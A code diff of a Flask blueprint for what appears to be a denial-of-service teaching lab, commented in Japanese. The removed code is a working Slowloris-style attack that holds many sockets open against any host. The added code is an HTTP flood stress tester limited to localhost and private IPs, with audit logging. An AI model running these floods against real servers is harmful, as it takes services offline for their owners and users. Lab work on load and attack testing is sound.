@@ -1,110 +1,182 @@
-import socket
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from datetime import datetime
+import ipaddress
+import json
+import os
 import threading
 import time
+from urllib.parse import urlparse
 from flask import Blueprint, jsonify, render_template, request
+import requests
+from requests.sessions import Session
+from requests.exceptions import RequestException
 
-# Blueprintの定義
-socket_bp = Blueprint("socket_lab", __name__, template_folder="templates")
+dos_bp = Blueprint("dos_lab", __name__, template_folder="templates")
 
-# 実行状態を管理する変数
-socket_status = {
-    "is_running": False,
-    "active_connections": 0,
-    "message": "待機中",
-}
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+AUDIT_LOG_FILE = os.path.join(BASE_DIR, "stress_audit_logs.json")
+
+MAX_REQUESTS = 2000
+MAX_CONCURRENCY = 2000
+REQUEST_TIMEOUT_SEC = 0.1
+MAX_SAVED_LOGS = 1000
+
+log_lock = threading.Lock()
 
 
-def run_raw_socket_test(target_host, port, connections, sleep_time):
-  global socket_status
-  socket_status["is_running"] = True
-  socket_status["active_connections"] = 0
-  socket_status["message"] = "ソケットテスト実行中..."
+def is_safe_target_url(url: str) -> tuple[bool, str]:
+  """ローカルまたはプライベートネットワーク宛てのHTTP/HTTPS URLか検証する"""
+  parsed = urlparse((url or "").strip())
+  if parsed.scheme not in ("http", "https"):
+    return False, "URLは http:// または https:// で指定してください"
 
-  sockets = []
+  host = (parsed.hostname or "").strip().lower()
+  if not host:
+    return False, "ホスト名が指定されていません"
 
-  # ① 接続をたくさん作る
-  for i in range(connections):
-    if not socket_status["is_running"]:
-      break
+  if host in ("localhost", "::1"):
+    return True, ""
+
+  try:
+    ip_obj = ipaddress.ip_address(host)
+    if ip_obj.is_loopback or ip_obj.is_private:
+      return True, ""
+  except ValueError:
+    pass
+
+  return (
+      False,
+      "安全のため、localhost / 192.168.111.129 / プライベートIP宛てのみ許可されています",
+  )
+
+
+def load_audit_logs() -> list[dict]:
+  with log_lock:
+    if os.path.exists(AUDIT_LOG_FILE):
+      try:
+        with open(AUDIT_LOG_FILE, "r", encoding="utf-8") as f:
+          data = json.load(f)
+          if isinstance(data, list):
+            return data
+      except Exception:
+        pass
+    return []
+
+
+def append_audit_log(entry: dict) -> None:
+  with log_lock:
+    logs = []
+    if os.path.exists(AUDIT_LOG_FILE):
+      try:
+        with open(AUDIT_LOG_FILE, "r", encoding="utf-8") as f:
+          loaded = json.load(f)
+          if isinstance(loaded, list):
+            logs = loaded
+      except Exception:
+        logs = []
+
+    logs.insert(0, entry)
+    logs = logs[:MAX_SAVED_LOGS]
+
     try:
-      s = socket.socket()
-      s.settimeout(10)
-      s.connect((target_host, port))
-
-      # リクエスト開始（終わらせない）
-      s.send(b"POST / HTTP/1.1\r\n")
-      s.send(b"Host: test\r\n")
-      sockets.append(s)
-      socket_status["active_connections"] = len(sockets)
+      with open(AUDIT_LOG_FILE, "w", encoding="utf-8") as f:
+        json.dump(logs, f, ensure_ascii=False, indent=2)
     except Exception:
       pass
 
-  # ② 遅延して少しずつ送る（停止ボタンが押されるか接続が切れるまで継続）
+
+def _send_single_request(url: str) -> tuple[bool, float]:
+  """1リクエスト送信し、(成功フラグ, レイテンシms) を返す"""
+  start = time.perf_counter()
   try:
-    while socket_status["is_running"] and sockets:
-      for s in list(sockets):
-        try:
-          s.send(b"X-Dummy: a\r\n")
-        except:
-          sockets.remove(s)
-          socket_status["active_connections"] = len(sockets)
-      time.sleep(sleep_time)
-  finally:
-    # 終了時にソケットをすべて閉じる
-    for s in sockets:
-      try:
-        s.close()
-      except:
-        pass
-    socket_status["is_running"] = False
-    socket_status["active_connections"] = 0
-    socket_status["message"] = "テスト終了"
+    with Session() as sess:
+      resp = sess.get(url, timeout=REQUEST_TIMEOUT_SEC)
+      elapsed_ms = (time.perf_counter() - start) * 1000.0
+      ok = 200 <= resp.status_code < 500
+      return ok, elapsed_ms
+  except RequestException:
+    elapsed_ms = (time.perf_counter() - start) * 1000.0
+    return False, elapsed_ms
+  
+
+def run_stress_test(url: str, total_requests: int, concurrency: int) -> dict:
+  """指定回数・同時接続数でストレステストを実行し、集計結果を返す"""
+  started_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+  wall_start = time.perf_counter()
+
+  success_count = 0
+  fail_count = 0
+  latencies_ms: list[float] = []
+
+  workers = min(concurrency, total_requests)
+  with ThreadPoolExecutor(max_workers=workers) as executor:
+    futures = [executor.submit(_send_single_request, url) for _ in range(total_requests)]
+    for fut in as_completed(futures):
+      ok, elapsed_ms = fut.result()
+      latencies_ms.append(elapsed_ms)
+      if ok:
+        success_count += 1
+      else:
+        fail_count += 1
+
+  total_time_sec = max(time.perf_counter() - wall_start, 0.0001)
+  avg_latency_ms = (
+      sum(latencies_ms) / len(latencies_ms) if latencies_ms else 0.0
+  )
+  requests_per_sec = total_requests / total_time_sec
+
+  result = {
+      "timestamp": started_at,
+      "target_url": url,
+      "command": f"stress -u {url} -n {total_requests} -c {concurrency}",
+      "total_requests": total_requests,
+      "concurrency": concurrency,
+      "total_time_sec": round(total_time_sec, 3),
+      "success_count": success_count,
+      "fail_count": fail_count,
+      "avg_latency_ms": round(avg_latency_ms, 2),
+      "requests_per_sec": round(requests_per_sec, 2),
+  }
+  append_audit_log(result)
+  return result
 
 
-@socket_bp.route("/")
+@dos_bp.route("/")
 def index():
-  return render_template("socket_test.html", status=socket_status)
+  return render_template("dos.html")
 
 
-@socket_bp.route("/api/socket/start", methods=["POST"])
-def start_socket_test():
-  if socket_status["is_running"]:
+@dos_bp.route("/api/stress", methods=["POST"])
+def api_run_stress():
+  data = request.get_json(silent=True) or {}
+  url = str(data.get("url", "")).strip()
+
+  try:
+    total_requests = int(data.get("requests", 50))
+    concurrency = int(data.get("concurrency", 10))
+  except (TypeError, ValueError):
+    return jsonify({"error": "requests と concurrency は整数で指定してください"}), 400
+
+  is_safe, reason = is_safe_target_url(url)
+  if not is_safe:
+    return jsonify({"error": reason}), 400
+
+  if not (1 <= total_requests <= MAX_REQUESTS):
     return (
-        jsonify({"status": "error", "message": "すでにテストが実行中です"}),
+        jsonify({"error": f"リクエスト数は 1〜{MAX_REQUESTS} の範囲で指定してください"}),
         400,
     )
 
-  data = request.get_json() or {}
-  target_host = data.get("host", "127.0.0.1")
-  port = int(data.get("port", 80))
-  connections = int(data.get("connections", 1000))
-  sleep_time = float(data.get("sleep_time", 0.05))
+  if not (1 <= concurrency <= MAX_CONCURRENCY):
+    return (
+        jsonify({"error": f"同時接続数は 1〜{MAX_CONCURRENCY} の範囲で指定してください"}),
+        400,
+    )
 
-  # バックグラウンドスレッドで実行（Flaskのメインプロセスをブロックしないため）
-  t = threading.Thread(
-      target=run_raw_socket_test,
-      args=(target_host, port, connections, sleep_time),
-  )
-  t.daemon = True
-  t.start()
-
-  return jsonify(
-      {
-          "status": "success",
-          "message": "ソケットテストを開始しました",
-          "target": target_host,
-          "connections": connections,
-      }
-  )
+  result = run_stress_test(url, total_requests, concurrency)
+  return jsonify(result), 200
 
 
-@socket_bp.route("/api/socket/stop", methods=["POST"])
-def stop_socket_test():
-  global socket_status
-  socket_status["is_running"] = False
-  return jsonify({"status": "success", "message": "テストを停止します"})
-
-
-@socket_bp.route("/api/socket/status", methods=["GET"])
-def get_socket_status():
-  return jsonify(socket_status)
+@dos_bp.route("/api/stress/logs", methods=["GET"])
+def api_get_stress_logs():
+  return jsonify(load_audit_logs()), 200
